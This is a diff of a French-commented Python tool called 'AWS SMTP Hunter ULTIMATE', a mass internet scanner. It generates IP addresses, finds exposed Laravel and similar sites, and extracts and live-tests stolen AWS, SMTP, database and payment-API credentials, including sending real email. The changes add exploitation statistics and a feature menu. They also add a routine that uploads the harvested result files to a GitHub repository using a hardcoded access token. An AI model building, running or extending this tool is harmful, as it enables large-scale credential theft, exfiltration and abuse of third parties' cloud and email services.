@@ -2893,6 +2893,55 @@ You can use these credentials for email sending.
         print(f"   Total Runtime:      {elapsed/3600:.1f}h ({elapsed/60:.1f}min)")
         print(f"   Success Rate:       {self.stats.get('success_rate', 0)*100:.1f}%")
         
+        # Volume stats
+        print(f"\n📊 VOLUME STATISTICS:")
+        print(f"   IPs Generated:      {self.stats['generated']:,}")
+        print(f"   IPs Checked:        {self.stats['checked']:,}")
+        print(f"   IPs Valid:          {self.stats['valid']:,}")
+        print(f"   IPs Vulnerable:     {self.stats['vulnerable']:,}")
+        print(f"   IPs Exploited:      {self.stats['exploited']:,}")
+        print(f"   Efficiency:         {self.stats['valid']/max(1,self.stats['checked'])*100:.2f}%")
+        
+        # Exploitation summary
+        print(f"\n🔥 EXPLOITATION SUMMARY:")
+        print(f"   Laravel Sites:      {self.stats['laravel_found']:,}")
+        print(f"   AWS Credentials:    {self.stats['aws_working']:,} working / {self.stats['aws_found']:,} found")
+        print(f"   SMTP Credentials:   {self.stats['smtp_working']:,} working / {self.stats['smtp_found']:,} found")
+        print(f"   Database Access:    {self.stats['database_working']:,} working / {self.stats['database_found']:,} found")
+        print(f"   API Access:         {self.stats['api_working']:,} working / {self.stats['api_found']:,} found")
+        print(f"   Emails Sent:        {self.stats['emails_sent']:,}")
+        
+        # Service breakdown
+        if self.stats['aws_working'] > 0:
+            print(f"\n☁️ AWS SERVICES:")
+            print(f"   SES Ready:          {self.stats.get('aws_ses_ready', 0):,}")
+            print(f"   SMS Ready:          {self.stats.get('aws_sms_ready', 0):,}")
+            
+        if self.stats['database_working'] > 0:
+            print(f"\n🗄️ DATABASE ACCESS:")
+            print(f"   MySQL:              {self.stats.get('mysql_working', 0):,}")
+            print(f"   PostgreSQL:         {self.stats.get('postgresql_working', 0):,}")
+            
+        if self.stats['api_working'] > 0:
+            print(f"\n🔗 API ACCESS:")
+            print(f"   Twilio:             {self.stats.get('twilio_working', 0):,}")
+            print(f"   Stripe:             {self.stats.get('stripe_working', 0):,}")
+            print(f"   SendGrid:           {self.stats.get('sendgrid_working', 0):,}")
+            print(f"   Mailgun:            {self.stats.get('mailgun_working', 0):,}")
+            
+        # Files generated
+        print(f"\n📁 FILES GENERATED:")
+        total_size = 0
+        for file_key, filename in self.output_files.items():
+            try:
+                size = os.path.getsize(filename) if os.path.exists(filename) else 0
+                total_size += size
+                print(f"   {filename:35} {size:,} bytes")
+            except:
+                print(f"   {filename:35} Error")
+                
+        print(f"   {'TOTAL SIZE:':35} {total_size:,} bytes ({total_size/1024/1024:.1f} MB)")
+        
         print("="*120)
         print("🎯 SCAN COMPLETED - Thank you for using AWS SMTP Hunter ULTIMATE!")
         print("="*120)
@@ -2901,7 +2950,7 @@ You can use these credentials for email sending.
 # ==================== FONCTIONS UTILITAIRES ====================
 
 def push_results_to_github():
-    """🔁 Push via API GitHub - Compatible PC + Render"""
+    """🔁 Push via API GitHub UNIQUEMENT - ZERO Git"""
     try:
         import requests
         import base64
@@ -2910,7 +2959,7 @@ def push_results_to_github():
         
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         
-        # Configuration GitHub
+        # Configuration GitHub - TON NOUVEAU TOKEN
         GITHUB_TOKEN = "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"
         REPO_OWNER = "mehdi28777"
         REPO_NAME = "data"
@@ -2924,12 +2973,12 @@ def push_results_to_github():
         # Détection environnement
         environment = "Render" if os.environ.get('RENDER') else platform.system()
         print(f"🔍 Environment: {environment}")
-        print(f"🚀 Uploading files via GitHub API...")
+        print(f"🚀 Uploading files via GitHub API (ZERO Git usage)...")
         
         files_uploaded = 0
         files_found = 0
         
-        # Lister tous les fichiers .txt dans le répertoire
+        # Lister tous les fichiers .txt dans le répertoire courant
         for filename in os.listdir("."):
             if not filename.endswith(".txt"):
                 continue
@@ -2952,12 +3001,12 @@ def push_results_to_github():
                 content_bytes = content.encode('utf-8')
                 content_b64 = base64.b64encode(content_bytes).decode('utf-8')
                 
-                # Préparer le nom de fichier avec préfixe environnement
-                upload_filename = f"{environment.lower()}_{filename}"
+                # Préparer le nom de fichier avec préfixe environnement et timestamp
+                upload_filename = f"{environment.lower()}_{timestamp}_{filename}"
                 
                 # Données pour l'API GitHub
                 data = {
-                    'message': f'{environment} scan results - {filename} - {timestamp}',
+                    'message': f'{environment} scan - {filename} - {timestamp}',
                     'content': content_b64,
                     'branch': 'main'
                 }
@@ -2967,7 +3016,7 @@ def push_results_to_github():
                 
                 # Vérifier si le fichier existe déjà (pour récupérer le SHA)
                 print(f"🔍 Checking if {upload_filename} exists...")
-                check_response = requests.get(api_url, headers=headers, timeout=10)
+                check_response = requests.get(api_url, headers=headers, timeout=15)
                 
                 if check_response.status_code == 200:
                     # Fichier existe, récupérer le SHA pour la mise à jour
@@ -2976,7 +3025,7 @@ def push_results_to_github():
                     print(f"📝 File exists, updating...")
                 elif check_response.status_code == 404:
                     # Fichier n'existe pas, création
-                    print(f"📝 File doesn't exist, creating...")
+                    print(f"📝 File doesn't exist, creating new...")
                 else:
                     print(f"⚠️ Unexpected response: {check_response.status_code}")
                 
@@ -2990,13 +3039,19 @@ def push_results_to_github():
                     files_uploaded += 1
                 else:
                     print(f"❌ Failed to upload {filename}")
-                    print(f"   Status: {response.status_code}")
+                    print(f"   HTTP Status: {response.status_code}")
                     try:
                         error_data = response.json()
-                        print(f"   Error: {error_data.get('message', 'Unknown error')}")
+                        print(f"   Error Message: {error_data.get('message', 'Unknown error')}")
+                        if 'errors' in error_data:
+                            for error in error_data['errors']:
+                                print(f"   Detail: {error}")
                     except:
-                        print(f"   Raw response: {response.text[:200]}")
+                        print(f"   Raw response: {response.text[:300]}")
                         
+            except requests.exceptions.Timeout:
+                print(f"❌ Timeout uploading {filename}")
+                continue
             except requests.exceptions.RequestException as e:
                 print(f"❌ Network error for {filename}: {e}")
                 continue
@@ -3004,28 +3059,35 @@ def push_results_to_github():
                 print(f"❌ Error processing {filename}: {e}")
                 continue
         
-        # Résumé final
-        print(f"\n📊 UPLOAD SUMMARY:")
+        # Résumé final détaillé
+        print(f"\n📊 GITHUB API UPLOAD SUMMARY:")
+        print(f"   Environment:    {environment}")
+        print(f"   Timestamp:      {timestamp}")
         print(f"   Files found:    {files_found}")
         print(f"   Files uploaded: {files_uploaded}")
         print(f"   Success rate:   {(files_uploaded/max(1,files_found)*100):.1f}%")
         
         if files_uploaded > 0:
-            print(f"\n🎉 SUCCESS! {files_uploaded} files uploaded to GitHub!")
+            print(f"\n🎉 API SUCCESS! {files_uploaded} files uploaded to GitHub!")
             print(f"🔗 View repository: https://github.com/{REPO_OWNER}/{REPO_NAME}")
-            print(f"🔗 Latest files: https://github.com/{REPO_OWNER}/{REPO_NAME}/tree/main")
+            print(f"🔗 Latest commit: https://github.com/{REPO_OWNER}/{REPO_NAME}/commits/main")
             return True
         else:
-            print(f"\n❌ No files were uploaded successfully")
+            print(f"\n❌ API FAILED! No files were uploaded successfully")
+            if files_found == 0:
+                print("   Reason: No .txt files found in current directory")
+            else:
+                print("   Reason: All upload attempts failed")
             return False
             
     except ImportError as e:
-        print(f"❌ Missing required module: {e}")
-        print("💡 Try: pip install requests")
+        print(f"❌ Missing required module for GitHub API: {e}")
+        print("💡 Solution: pip install requests")
         return False
     except Exception as e:
         print(f"❌ Critical error in GitHub API upload: {e}")
         import traceback
+        print("📋 Full error traceback:")
         traceback.print_exc()
         return False
 
@@ -3098,6 +3160,19 @@ def show_interactive_menu():
     print("   2. RANDOM   - Pure random generation for maximum coverage")
     print("   3. HYBRID   - 70% Smart + 30% Random (RECOMMENDED)")
     print()
+    print("⚡ FEATURES INCLUDED:")
+    print("   • Async + Multi-threading for maximum performance")
+    print("   • Real-time framework detection (Laravel, Symfony, Django, etc.)")
+    print("   • Complete credential extraction and exploitation")
+    print("   • Live SMTP testing with real email sending")
+    print("   • AWS credentials testing with service quotas")
+    print("   • Database connection testing (MySQL, PostgreSQL)")
+    print("   • API testing (Twilio, Stripe, SendGrid, Mailgun)")
+    print("   • Intelligent learning and adaptation")
+    print("   • Advanced performance monitoring")
+    print("   • Automatic cleanup and optimization")
+    print("   • Comprehensive logging and reporting")
+    print()
     
     while True:
         try:
@@ -3166,18 +3241,24 @@ def parse_command_line_arguments():
     """📋 Parsing des arguments CLI ultra-complet"""
     parser = argparse.ArgumentParser(
         description="🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition",
-        formatter_class=argparse.RawDescriptionHelpFormatter
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+🔥 EXAMPLES:
+  python hunter.py                                    # Interactive mode
+  python hunter.py --mode hybrid --threads 1000      # Quick start
+  python hunter.py --mode smart --threads 2000 --email your@email.com --debug
+        """
     )
     
-    parser.add_argument('--mode', '-m', choices=['smart', 'random', 'hybrid'])
-    parser.add_argument('--threads', '-t', type=int)
-    parser.add_argument('--email', '-e', type=str)
-    parser.add_argument('--debug', '-d', action='store_true')
-    parser.add_argument('--output-dir', '-o', type=str)
-    parser.add_argument('--config', type=str)
+    parser.add_argument('--mode', '-m', choices=['smart', 'random', 'hybrid'], help='IP generation mode')
+    parser.add_argument('--threads', '-t', type=int, help='Number of threads')
+    parser.add_argument('--email', '-e', type=str, help='Test email for SMTP validation')
+    parser.add_argument('--debug', '-d', action='store_true', help='Enable debug mode')
+    parser.add_argument('--output-dir', '-o', type=str, help='Output directory')
+    parser.add_argument('--config', type=str, help='Load configuration from JSON file')
     parser.add_argument('--version', '-v', action='version', version='AWS SMTP Hunter ULTIMATE v5.0')
-    parser.add_argument('--quiet', '-q', action='store_true')
-    parser.add_argument('--no-async', action='store_true')
+    parser.add_argument('--quiet', '-q', action='store_true', help='Quiet mode')
+    parser.add_argument('--no-async', action='store_true', help='Disable async mode')
     
     return parser.parse_args()
 
@@ -3286,407 +3367,7 @@ def main():
         print(f"   Threads:           {threads}")
         print(f"   Test Email:        {email}")
         print(f"   Debug Mode:        {debug}")
-        print(f"   GitHub API:        ✅ Enabled")
-    
-    # Création du hunter
-    try:
-        hunter = UltimateAWSHunter(
-            mode=mode,
-            threads=threads,
-            test_email=email,
-            debug=debug
-        )
-        
-        # Configuration gestionnaires de signaux
-        setup_signal_handlers(hunter)
-        
-        # Confirmation finale si interactif
-        if not args.mode and not args.quiet:
-            print(f"\n🚀 READY TO START COMPLETE SCAN!")
-            input("\n🚀 Press Enter to start the complete scan...")
-        
-        # Lancement du scan complet
-        hunter.run_complete_scan()
-        
-    except KeyboardInterrupt:
-        print("\n🛑 Scan interrupted by user")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n❌ Critical error: {e}")
-        if debug:
-            import traceback
-            traceback.print_exc()
-        sys.exit(1)
-
-if __name__ == "__main__":
-    # Protection multiprocessing
-    multiprocessing.freeze_support()
-    
-    # Vérification version Python
-    if sys.version_info < (3, 7):
-        print("❌ Python 3.7+ required for AWS SMTP Hunter ULTIMATE")
-        sys.exit(1)
-    
-    # Lancement
-    main()
-
-def setup_signal_handlers(hunter):
-    """⚡ Configuration gestionnaires de signaux"""
-    def signal_handler(signum, frame):
-        print(f"\n🛑 Signal {signum} received - Graceful shutdown...")
-        hunter.stop_complete_scan()
-        sys.exit(0)
-    
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
-def check_system_requirements():
-    """🔍 Vérification des prérequis système"""
-    print("🔍 Checking system requirements...")
-    
-    # Python version
-    if sys.version_info < (3, 7):
-        print("❌ Python 3.7+ required")
-        return False
-        
-    # Required modules
-    required = [
-        ('psutil', 'System monitoring'),
-        ('requests', 'HTTP requests'),
-        ('urllib3', 'HTTP utilities')
-    ]
-    
-    missing = []
-    for module, desc in required:
-        try:
-            __import__(module)
-            print(f"✅ {module} - {desc}")
-        except ImportError:
-            print(f"❌ {module} - {desc} (pip install {module})")
-            missing.append(module)
-            
-    # Optional modules
-    optional = [
-        ('aiohttp', 'Async HTTP (performance boost)', AIOHTTP_AVAILABLE),
-        ('boto3', 'AWS testing', BOTO3_AVAILABLE),
-        ('mysql.connector', 'MySQL testing', MYSQL_AVAILABLE),
-        ('psycopg2', 'PostgreSQL testing', POSTGRES_AVAILABLE),
-        ('stripe', 'Stripe API testing', STRIPE_AVAILABLE),
-        ('twilio', 'Twilio API testing', TWILIO_AVAILABLE)
-    ]
-    
-    for module, desc, available in optional:
-        status = "✅" if available else "⚠️"
-        print(f"{status} {module} - {desc}")
-        
-    if missing:
-        print(f"\n❌ Missing required modules: {', '.join(missing)}")
-        print("Install with: pip install " + " ".join(missing))
-        return False
-        
-    print("✅ All system requirements satisfied")
-    return True
-
-def show_interactive_menu():
-    """📋 Menu interactif ultra-complet"""
-    print("="*120)
-    print("🔥 AWS SMTP HUNTER ULTIMATE v5.0 - COMPLETE EDITION")
-    print("🎯 MAXIMUM PERFORMANCE CONFIGURATION")
-    print("="*120)
-    print()
-    print("🎯 IP GENERATION MODES:")
-    print("   1. SMART    - Intelligent generation targeting productive ranges")
-    print("   2. RANDOM   - Pure random generation for maximum coverage")
-    print("   3. HYBRID   - 70% Smart + 30% Random (RECOMMENDED)")
-    print()
-    print("⚡ FEATURES INCLUDED:")
-    print("   • Async + Multi-threading for maximum performance")
-    print("   • Real-time framework detection (Laravel, Symfony, Django, etc.)")
-    print("   • Complete credential extraction and exploitation")
-    print("   • Live SMTP testing with real email sending")
-    print("   • AWS credentials testing with service quotas")
-    print("   • Database connection testing (MySQL, PostgreSQL)")
-    print("   • API testing (Twilio, Stripe, SendGrid, Mailgun)")
-    print("   • Intelligent learning and adaptation")
-    print("   • Advanced performance monitoring")
-    print("   • Automatic cleanup and optimization")
-    print("   • Comprehensive logging and reporting")
-    print()
-    print("🔧 PERFORMANCE OPTIMIZATIONS:")
-    print("   • Adaptive delays (0.01-0.1s)")
-    print("   • Intelligent queue management")
-    print("   • Memory optimization and cleanup")
-    print("   • CPU usage monitoring and adjustment")
-    print("   • Network optimization")
-    print()
-    
-    while True:
-        try:
-            choice = input("🎯 Choose generation mode (1-3): ").strip()
-            if choice == '1':
-                return 'smart'
-            elif choice == '2':
-                return 'random'
-            elif choice == '3':
-                return 'hybrid'
-            else:
-                print("❌ Invalid choice. Please select 1, 2, or 3.")
-        except KeyboardInterrupt:
-            print("\n🛑 Exit requested")
-            sys.exit(0)
-
-def get_advanced_configuration():
-    """⚙️ Configuration avancée interactive"""
-    print("\n⚙️ ADVANCED CONFIGURATION:")
-    
-    # Threads
-    while True:
-        try:
-            default_threads = min(2000, multiprocessing.cpu_count() * 50)
-            threads_input = input(f"🔧 Number of threads (default: {default_threads}, max: 5000): ").strip()
-            if not threads_input:
-                threads = default_threads
-                break
-            threads = int(threads_input)
-            if 1 <= threads <= 5000:
-                break
-            print("❌ Threads must be between 1 and 5000")
-        except ValueError:
-            print("❌ Please enter a valid number")
-        except KeyboardInterrupt:
-            print("\n🛑 Exit requested")
-            sys.exit(0)
-    
-    # Email
-    while True:
-        try:
-            email = input("📧 Test email for SMTP validation (default: test@example.com): ").strip()
-            if not email:
-                email = "test@example.com"
-                break
-            if '@' in email and '.' in email.split('@')[1]:
-                break
-            print("❌ Invalid email format")
-        except KeyboardInterrupt:
-            print("\n🛑 Exit requested")
-            sys.exit(0)
-    
-    # Debug mode
-    while True:
-        try:
-            debug_input = input("🐛 Enable debug mode? (y/N): ").strip().lower()
-            debug = debug_input in ['y', 'yes', '1', 'true']
-            break
-        except KeyboardInterrupt:
-            print("\n🛑 Exit requested")
-            sys.exit(0)
-    
-    return threads, email, debug
-
-def parse_command_line_arguments():
-    """📋 Parsing des arguments CLI ultra-complet"""
-    parser = argparse.ArgumentParser(
-        description="🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-🔥 EXAMPLES:
-  python hunter.py                                    # Interactive mode
-  python hunter.py --mode hybrid --threads 1000      # Quick start
-  python hunter.py --mode smart --threads 2000 --email your@email.com --debug
-  
-🎯 MODES:
-  smart   : Intelligent targeting of productive IP ranges
-  random  : Pure random generation for maximum coverage  
-  hybrid  : Combination of smart + random (70/30 split)
-  
-⚡ PERFORMANCE:
-  • Recommended threads: 1000-2000 for optimal performance
-  • Higher thread counts require more system resources
-  • Async mode automatically enabled if aiohttp available
-  
-📧 FEATURES:
-  • Real-time SMTP testing with email sending
-  • AWS credentials validation with service analysis
-  • Database connection testing (MySQL, PostgreSQL)
-  • API testing (Twilio, Stripe, SendGrid, Mailgun)
-  • Framework detection (Laravel, Symfony, Django, etc.)
-  • Intelligent learning and performance adaptation
-        """
-    )
-    
-    parser.add_argument(
-        '--mode', '-m',
-        choices=['smart', 'random', 'hybrid'],
-        help='IP generation mode (default: interactive)'
-    )
-    
-    parser.add_argument(
-        '--threads', '-t',
-        type=int,
-        help='Number of threads (default: auto-detect, max: 5000)'
-    )
-    
-    parser.add_argument(
-        '--email', '-e',
-        type=str,
-        help='Test email for SMTP validation (default: test@example.com)'
-    )
-    
-    parser.add_argument(
-        '--debug', '-d',
-        action='store_true',
-        help='Enable debug mode with verbose logging'
-    )
-    
-    parser.add_argument(
-        '--output-dir', '-o',
-        type=str,
-        help='Output directory for results (default: current directory)'
-    )
-    
-    parser.add_argument(
-        '--config',
-        type=str,
-        help='Load configuration from JSON file'
-    )
-    
-    parser.add_argument(
-        '--version', '-v',
-        action='version',
-        version='AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition'
-    )
-    
-    parser.add_argument(
-        '--quiet', '-q',
-        action='store_true',
-        help='Quiet mode - minimal output'
-    )
-    
-    parser.add_argument(
-        '--no-async',
-        action='store_true',
-        help='Disable async mode (force sync only)'
-    )
-    
-    return parser.parse_args()
-
-def load_configuration_file(config_path):
-    """📄 Chargement configuration depuis fichier JSON"""
-    try:
-        with open(config_path, 'r', encoding='utf-8') as f:
-            config = json.load(f)
-            
-        return {
-            'mode': config.get('mode', 'hybrid'),
-            'threads': config.get('threads', 1000),
-            'email': config.get('email', 'test@example.com'),
-            'debug': config.get('debug', False)
-        }
-    except Exception as e:
-        print(f"❌ Error loading config file: {e}")
-        return None
-
-def validate_configuration(mode, threads, email, debug):
-    """✅ Validation de la configuration"""
-    errors = []
-    
-    # Validation mode
-    if mode not in ['smart', 'random', 'hybrid']:
-        errors.append(f"Invalid mode: {mode}")
-        
-    # Validation threads
-    if not 1 <= threads <= 5000:
-        errors.append(f"Threads must be between 1 and 5000, got: {threads}")
-        
-    # Validation email
-    if not email or '@' not in email:
-        errors.append(f"Invalid email: {email}")
-        
-    # Warning for high thread count
-    if threads > 3000:
-        print(f"⚠️ WARNING: {threads} threads is very high and may impact system performance")
-        
-    if errors:
-        print("❌ Configuration errors:")
-        for error in errors:
-            print(f"   • {error}")
-        return False
-        
-    return True
-
-def main():
-    """🚀 Fonction principale ultra-complète"""
-    print("🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition")
-    print("🎯 Initializing maximum performance configuration...")
-    
-    # Vérification des prérequis
-    if not check_system_requirements():
-        print("❌ System requirements not met")
-        sys.exit(1)
-    
-    # Parsing des arguments
-    args = parse_command_line_arguments()
-    
-    # Configuration
-    if args.config:
-        # Chargement depuis fichier
-        config = load_configuration_file(args.config)
-        if not config:
-            sys.exit(1)
-        mode = config['mode']
-        threads = config['threads']
-        email = config['email']
-        debug = config['debug']
-    elif args.mode and args.threads and args.email:
-        # Configuration via CLI
-        mode = args.mode
-        threads = args.threads
-        email = args.email
-        debug = args.debug
-    else:
-        # Configuration interactive
-        mode = show_interactive_menu()
-        threads, email, debug = get_advanced_configuration()
-    
-    # Override avec args CLI si spécifiés
-    if args.mode:
-        mode = args.mode
-    if args.threads:
-        threads = args.threads
-    if args.email:
-        email = args.email
-    if args.debug:
-        debug = True
-        
-    # Validation finale
-    if not validate_configuration(mode, threads, email, debug):
-        sys.exit(1)
-    
-    # Configuration output directory
-    if args.output_dir:
-        try:
-            os.makedirs(args.output_dir, exist_ok=True)
-            os.chdir(args.output_dir)
-        except Exception as e:
-            print(f"❌ Error setting output directory: {e}")
-            sys.exit(1)
-    
-    # Disable async if requested
-    global AIOHTTP_AVAILABLE
-    if args.no_async:
-        AIOHTTP_AVAILABLE = False
-        print("⚠️ Async mode disabled by user request")
-    
-    # Affichage configuration finale
-    if not args.quiet:
-        print(f"\n⚙️ FINAL CONFIGURATION:")
-        print(f"   Mode:              {mode}")
-        print(f"   Threads:           {threads}")
-        print(f"   Test Email:        {email}")
-        print(f"   Debug Mode:        {debug}")
-        print(f"   Async Available:   {AIOHTTP_AVAILABLE}")
-        print(f"   Output Directory:  {os.getcwd()}")
-        print(f"   Quiet Mode:        {args.quiet}")
+        print(f"   GitHub API:        ✅ Enabled (NO Git)")
     
     # Création du hunter
     try:
